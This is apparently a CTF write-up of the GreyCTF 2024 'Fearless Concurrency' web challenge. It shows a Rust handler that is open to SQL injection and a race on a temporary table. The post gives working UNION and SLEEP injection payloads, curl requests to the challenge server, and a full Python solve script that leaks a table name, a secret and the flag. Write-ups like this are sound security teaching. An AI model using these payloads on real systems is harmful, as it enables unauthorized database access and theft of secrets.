---
title: Fearless Concurrency
author: yufong
categories: [GreyCTF 2024, Web]
date: 2024-04-20
date_time: 2024-04-20 18:09
tags:
  - greyctf-2024
  - writeup-winner
info:
  description: "Rust is the most safest, fastest and bestest language to write web app! The code compiles, therefore it is impossible for bugs!"
  difficulty: 3
solved: no
solution:
  - "https://github.com/NUSGreyhats/greyctf24-challs-public/tree/main/quals/web/fearless-concurrency/fearless-concurrency-solve"
img_path: /_posts/Writeups/CTF/GreyCTF%202024/Web/Fearless%20Concurrency/attachments/
image:
  path: /_posts/Writeups/CTF/GreyCTF%202024/Web/Fearless%20Concurrency/attachments/../../Beautiful%20Styles/attachments/Beautiful%20Styles-20240510000105525.png
  width: 1000   # in pixels
  height: 400   # in pixels
---

## Challenge Description

{{page.info.description}}

## Source Code Analysis

```rust
async fn query(State(state): State<AppState>, Json(body): Json<Query>) -> axum::response::Result<String> {
    let users = state.users.read().await;
    let user = users.get(&body.user_id).ok_or_else(|| "User not found! Register first!")?;
    let user = user.clone();

    // Prevent registrations from being blocked while query is running
    // Fearless concurrency :tm:
    drop(users);

    // Prevent concurrent access to the database!
    // Don't even try any race condition thingies
    // They don't exist in rust!
    let _lock = user.lock.lock().await;
    let mut conn = state.pool.get_conn().await.map_err(|_| "Failed to acquire connection")?;

    // Unguessable table name (requires knowledge of user id and random table id)
    let table_id = rand::random::<u32>();
    let mut hasher = Sha1::new();
    hasher.update(b"fearless_concurrency");
    hasher.update(body.user_id.to_le_bytes());
    let table_name = format!("tbl_{}_{}", hex::encode(hasher.finalize()), table_id);

    let table_name = dbg!(table_name);
    let qs = dbg!(body.query_string);

    // Create temporary, unguessable table to store user secret
    conn.exec_drop(
        format!("CREATE TABLE {} (secret int unsigned)", table_name), ()
    ).await.map_err(|_| "Failed to create table")?;

    conn.exec_drop(
        format!("INSERT INTO {} values ({})", table_name, user.secret), ()
    ).await.map_err(|_| "Failed to insert secret")?;


    // Secret can't be leaked here since table name is unguessable!
    let res = conn.exec_first::<String, _, _>(
        format!("SELECT * FROM info WHERE body LIKE '{}'", qs),
        ()
    ).await;

    // You'll never get the secret!
    conn.exec_drop(
        format!("DROP TABLE {}", table_name), ()
    ).await.map_err(|_| "Failed to drop table")?;

    let res = res.map_err(|_| "Failed to run query")?;

    // _lock is automatically dropped when function exits, releasing the user lock

    if let Some(result) = res {
        return Ok(result);
    }
    Ok(String::from("No results!"))
}
```

>**Line 17-21:**
>- We can figure out the table name partially, `table_{<here>}_{}`, since its taken from `user_id` (plaintext) and the string `fearless_concurrency` (salt)
>	- `user_id` is returned when a user is registered

>**Line 37-40:**
>- Susceptible to SQLi due to lack of input sanitization
 
>**Line 27-47:**
>1. A table (we know the name) is created and user secret is inserted, 
>2. A query can be made (vulnerable to sqli), we are just retrieving `Hello World!`
>3. Table is dropped


## Solution

1. Register 2 users, `dummy_id`, `user_id`
	1. `user_id` is used to sleep MySQL (so that table is not deleted) and retrieve the Flag
	2. `dummy_id` is used to leak the full `table name (tbl_{}_{})` and `user_secret`
2. Inject a sleep statement with `uid1`
3. Retrieve full table name using SQL `LIKE` operator with `uid2`
4. Retrieve secret with `uid2`
5. Retrieve flag with `uid1`

### Manual

1. Create 2 users
	```
	┌──(root💀kali)-[~/…/ctf/greyCTF2024/WEB/Fearless Concurrency]
	└─$ curl -X POST http://challs.nusgreyhats.org:33333/register
	15428637266543480840                                                                                                                                            
	┌──(root💀kali)-[~/…/ctf/greyCTF2024/WEB/Fearless Concurrency]
	└─$ curl -X POST http://challs.nusgreyhats.org:33333/register
	14423584875232163462                          
	```

2. Generate partial table name
	```
	In [1]: import hashlib
	
	In [2]: def get_hash(user_id):
	   ...:     hasher = hashlib.sha1()
	   ...:     hasher.update(b'fearless_concurrency')
	   ...:     hasher.update(user_id.to_bytes((user_id.bit_length() + 7) // 8, byteorder='little'))
	   ...:     table_prefix = f"tbl_{hasher.hexdigest()}"
	   ...:     return table_prefix
	   ...:
	
	In [3]: get_hash(15428637266543480840)
	Out[3]: 'tbl_574d112d2ed97edd59f7bd3880291ac45ffa8c2a'
	```
3. Inject Sleep
	```
	┌──(root💀kali)-[~/…/ctf/greyCTF2024/WEB/Fearless Concurrency]
	└─$ cat json/sleep.json
	{"user_id":15428637266543480840,"query_string":"' UNION SELECT (SELECT SLEEP(30))-- -"}
	```
	```
	┌──(root💀kali)-[~/…/ctf/greyCTF2024/WEB/Fearless Concurrency]
	└─$ curl -s -H "Content-Type: application/json" http://challs.nusgreyhats.org:33333/query -d @"json/sleep.json"
	```

4. Extract full table name
	```
	{"user_id":14423584875232163462,"query_string":"' UNION SELECT (SELECT table_name FROM information_schema.tables WHERE table_name LIKE 'tbl_574d112d2ed97edd59f7bd3880291ac45ffa8c2a%')-- -"}
	```
	```
	┌──(root💀kali)-[~/…/ctf/greyCTF2024/WEB/Fearless Concurrency]
	└─$ curl -s -H "Content-Type: application/json" http://challs.nusgreyhats.org:33333/query -d @"json/get_table_name.json"
	tbl_278a4fc337ddc0a24dd40a34d5e7f0f48d2ff6e1_1913583239    
	```

5. Extract secret
	```
	{"user_id":14423584875232163462,"query_string":"' UNION SELECT (SELECT * FROM tbl_574d112d2ed97edd59f7bd3880291ac45ffa8c2a_3680590309)-- -"}
	```
	```
	┌──(root💀kali)-[~/…/ctf/greyCTF2024/WEB/Fearless Concurrency]
	└─$ curl -s -H "Content-Type: application/json" http://challs.nusgreyhats.org:33333/query -d @"json/get_secret.json"
	2026828775
	```

6. Get Flag
	```
	{"user_id":15428637266543480840,"secret":1679592540}
	```
	```   
	┌──(root💀kali)-[~/…/ctf/greyCTF2024/WEB/Fearless Concurrency]
	└─$ curl -s -H "Content-Type: application/json" http://challs.nusgreyhats.org:33333/flag -d @"json/get_flag.json"
	grey{ru57_c4n7_pr3v3n7_l061c_3rr0r5}  
	```

- Demo 

	<video muted autoplay controls style="width: 740px; height: 460px;">
		<source src="{{site.cdn}}{{page.img_path}}2YHcR4CJY5.mp4" type="video/mp4">
	</video>



### Auto

1. Run script

    > [code](https://github.com/yufongg/ctf/blob/main/greyctf/2024/web/fearless_concurrency/solve.py)

	```
	┌──(root💀kali)-[~/…/ctf/greyCTF2024/WEB/Fearless Concurrency]
	└─$ python3 test.py
	[*] registered user 1
	[*] registered user 2
	[*] injecting sleep
	[*] extracting table, secret and flag
	[*] retrieved table name: tbl_17d6277119176dd65f3673d9718b80e8fa2a9f8b_3690022472
	[*] retrieved secret: 2527089681
	[*] retrieved flag: grey{ru57_c4n7_pr3v3n7_l061c_3rr0r5}
	[*] slept
	```
2. Demo 

	<video muted autoplay controls style="width: 740px; height: 460px;">
		<source src="{{site.cdn}}{{page.img_path}}C4uRasuuAF.mp4" type="video/mp4">
	</video>

{% raw %}
## Code


```python
import requests
import threading
import time
import hashlib


##proxies = {'http': 'http://127.0.0.1:8080'}
URL = "http://challs.nusgreyhats.org:33333"

def get_hash(user_id):
    hasher = hashlib.sha1()
    hasher.update(b'fearless_concurrency')
    hasher.update(user_id.to_bytes((user_id.bit_length() + 7) // 8, byteorder='little'))
    table_prefix = f"tbl_{hasher.hexdigest()}"
    return table_prefix
    
def register():
    url = "http://challs.nusgreyhats.org:33333/register"
    r = requests.post(url)
    return int(r.text)

def sleeper(user_id):
    try:
        json = {"query_string": "' UNION SELECT SLEEP(15)-- -", "user_id": user_id}
        r = requests.post(f"{URL}/query", json=json)
        print("[*] slept")
    except requests.exceptions.Timeout:
        print("request timeout occurred.") 

def get_table(user_id, dummy_user_id):
    json = {"query_string": f"' UNION SELECT (SELECT table_name FROM information_schema.tables WHERE table_name LIKE '{get_hash(user_id)}%')-- -", 
            "user_id": dummy_user_id}
    r = requests.post(f"{URL}/query", json=json)
    print(f"[*] retrieved table name: {r.text}")
    return r.text

def get_secret(dummy_user_id, table_name):
    json = {"query_string": f"' UNION SELECT (SELECT * FROM {table_name})-- -", "user_id": dummy_user_id}
    r = requests.post(f"{URL}/query", json=json)
    print(f"[*] retrieved secret: {r.text}")
    return int(r.text)

def get_flag(user_id, secret):
    json = {"secret": secret, "user_id": user_id}
    r = requests.post(f"{URL}/flag",  json=json)
    print(f"[*] retrieved flag: {r.text}")
    return r.text

def main():
    dummy_user_id = register()
    print(f"[*] registered user 1")
    user_id = register()
    print(f"[*] registered user 2")

    print(f"[*] injecting sleep")   
    sleeper_thread = threading.Thread(target=sleeper, args=(user_id,))
    sleeper_thread.start()


    print(f"[*] extracting table, secret and flag")
    table_name = get_table(user_id, dummy_user_id)
    secret = get_secret(dummy_user_id, table_name)
    flag = get_flag(user_id, secret)
    

    sleeper_thread.join()

if __name__ == "__main__":
    main()

```

{% endraw %}

## Failed Attempt

Instead of trying to extract the full name of the table, tried to exfiltrate all the tables, store them in a list and iterate through all of them to get their secrets and then the flags.


After sleeping the MySQL db and then querying for all the tables, the new table (created cuz of the query) isn't displayed.


<video muted autoplay controls style="width: 740px; height: 460px;">
	<source src="{{site.cdn}}{{page.img_path}}Y8CXOfOtng.mp4" type="video/mp4">
</video>
